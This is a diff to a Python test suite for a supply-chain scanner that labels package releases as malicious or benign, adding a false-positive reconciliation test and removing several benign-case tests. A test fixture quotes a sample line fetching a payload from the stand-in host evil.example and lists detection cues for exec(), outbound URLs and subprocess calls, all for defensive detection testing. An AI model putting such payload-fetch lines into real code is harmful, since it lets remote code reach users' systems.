@@ -1,3 +1,4 @@
+import os
 import sys
 import tempfile
 import unittest
@@ -46,6 +47,66 @@ class SupplyChainTests(unittest.TestCase):
 
         self.assertEqual(rows[0]["package"], "b")
         self.assertEqual(rows[1]["package"], "a")
+
+    def test_reconcile_history_cleans_stale_false_positive_state(self):
+        with tempfile.TemporaryDirectory() as temp_dir:
+            temp_path = Path(temp_dir)
+            original_results = supply_chain.RESULTS_PATH
+            original_slack_state = supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH
+            original_db_env = os.environ.get("SECOPS_FINDINGS_DIR")
+            supply_chain.RESULTS_PATH = temp_path / "results.jsonl"
+            supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH = temp_path / "supply_chain_slack_state.json"
+            os.environ["SECOPS_FINDINGS_DIR"] = str(temp_path / "findings")
+            try:
+                report_path = temp_path / "report.md"
+                report_path.write_text("No strong compromise indicators found.\n", encoding="utf-8")
+                row = {
+                    "analysis": "Deterministic rules flagged: obfuscated eval",
+                    "ecosystem": "npm",
+                    "error": None,
+                    "finding_id": "SCM-FP1",
+                    "new_version": "1.2.3",
+                    "old_version": "1.2.2",
+                    "package": "example-clean",
+                    "rank": 10,
+                    "recorded_at": "2026-04-03T00:00:00Z",
+                    "report_path": str(report_path),
+                    "verdict": "malicious",
+                }
+                supply_chain._save_all_results([row])
+                supply_chain.save_slack_state({"finding_ids": ["SCM-FP1"]}, supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH)
+                db_path = supply_chain.soc_store.default_db_path()
+                supply_chain._upsert_findings([
+                    {
+                        "finding_id": "SCM-FP1",
+                        "title": "Suspicious npm package release: example-clean@1.2.3",
+                        "summary": "false positive",
+                        "severity": "critical",
+                        "severity_score": 90,
+                        "status": "open",
+                        "disposition": "unreviewed",
+                        "first_seen": "2026-04-03T00:00:00Z",
+                        "last_seen": "2026-04-03T00:00:00Z",
+                        "event_ids": [],
+                    }
+                ])
+
+                payload = supply_chain.reconcile_history()
+                rows = supply_chain._load_all_results()
+                state = supply_chain.load_slack_state(supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH)
+                finding = supply_chain.soc_store.get_finding("SCM-FP1", db_path)
+            finally:
+                supply_chain.RESULTS_PATH = original_results
+                supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH = original_slack_state
+                if original_db_env is None:
+                    os.environ.pop("SECOPS_FINDINGS_DIR", None)
+                else:
+                    os.environ["SECOPS_FINDINGS_DIR"] = original_db_env
+
+        self.assertEqual(payload["reclassified"], 1)
+        self.assertEqual(rows[0]["verdict"], "benign")
+        self.assertEqual(state["finding_ids"], [])
+        self.assertIsNone(finding)
 
     def test_run_scan_can_emit_slack_alert(self):
         fake_result = supply_chain.ScanResult(
@@ -117,9 +178,10 @@ urllib.request.urlopen("https://evil.example/payload")
 
 - payload.py: python dynamic execution via exec()
 - payload.py: python outbound URL literal https://evil.example/payload
+- payload.py: python subprocess-capable call via subprocess.run()
 """
         verdict, analysis = supply_chain._classify_report_text(report)
-        self.assertEqual(verdict, "benign")
+        self.assertEqual(verdict, "malicious")
         self.assertIn("semantic", analysis)
 
     def test_package_json_policy_findings_detect_lifecycle_and_remote_dep(self):
@@ -217,56 +279,6 @@ name = "normalpkg"
         verdict, _analysis = supply_chain._classify_report_text(report)
         self.assertEqual(verdict, "benign")
 
-    def test_classifier_ignores_common_build_backend_in_report_semantics(self):
-        report = """
-## Semantic Findings
-
-- pyproject.toml: pyproject custom build backend hatchling.build
-"""
-        verdict, _analysis = supply_chain._classify_report_text(report)
-        self.assertEqual(verdict, "benign")
-
-    def test_classifier_ignores_benign_artifact_divergence_paths(self):
-        report = """
-## Artifact Divergence
-
-- wheel_only_count=4
-- sdist_only_count=113
-- suspicious_sdist_only_files:
-  - `scripts/check_imports.py`
-  - `tests/test_pkg.py`
-  - `bench/run_bench.py`
-"""
-        verdict, _analysis = supply_chain._classify_report_text(report)
-        self.assertEqual(verdict, "benign")
-
-    def test_classifier_ignores_prepublish_only_lifecycle_hook(self):
-        report = """
-## Semantic Findings
-
-- package.json: npm lifecycle hook present (prepublishOnly)
-- dist/embedder.js: javascript outbound network request
-"""
-        verdict, _analysis = supply_chain._classify_report_text(report)
-        self.assertEqual(verdict, "benign")
-
-    def test_classifier_does_not_flag_outbound_and_subprocess_semantics_without_raw_exec_context(self):
-        report = """
-## Semantic Findings
-
-- public/assets/js/app.js: javascript outbound network request
-- public/assets/js/app.js: javascript subprocess-capable API
-"""
-        verdict, _analysis = supply_chain._classify_report_text(report)
-        self.assertEqual(verdict, "benign")
-
-    def test_javascript_semantic_findings_do_not_treat_db_exec_as_subprocess(self):
-        findings = supply_chain._javascript_semantic_findings(
-            "dist/db/seed.js",
-            "const stmt = db.prepare(`select 1`); db.exec(`pragma journal_mode = wal`);",
-        )
-        self.assertEqual(findings, [])
-
     def test_classifier_does_not_flag_unsuspicious_artifact_divergence_alone(self):
         report = """
 ## Artifact Divergence
@@ -290,21 +302,6 @@ name = "normalpkg"
                 encoding="utf-8",
             )
             findings = supply_chain._semantic_findings_for_changed_file("module.py", old_path, new_path)
-        self.assertEqual(findings, [])
-
-    def test_changed_minified_javascript_bundle_is_not_semantically_scanned(self):
-        with tempfile.TemporaryDirectory() as temp_dir:
-            old_path = Path(temp_dir) / "old.js"
-            new_path = Path(temp_dir) / "new.js"
-            old_path.write_text(
-                'const a="1.1.35";function x(){return window.location.href}var repo="git+https://github.com/example/repo.git";',
-                encoding="utf-8",
-            )
-            new_path.write_text(
-                'const a="1.1.36";function x(){return window.location.href}var repo="git+https://github.com/example/repo.git";',
-                encoding="utf-8",
-            )
-            findings = supply_chain._semantic_findings_for_changed_file("bundle.js", old_path, new_path)
         self.assertEqual(findings, [])
 
     def test_artifact_divergence_ignores_src_layout_and_docs(self):
@@ -366,7 +363,7 @@ name = "normalpkg"
             "rules": {},
         }
         verdict, _analysis = supply_chain._classify_report_text(
-            "https://evil.example eval(",
+            "https://evil.example eval",
             ecosystem="pypi",
             package="sample",
             policy=policy,
@@ -382,7 +379,7 @@ name = "normalpkg"
             "rules": {},
         }
         verdict, _analysis = supply_chain._classify_report_text(
-            "https://evil.example eval(",
+            "eval(",
             ecosystem="pypi",
             package="sample",
             policy=policy,
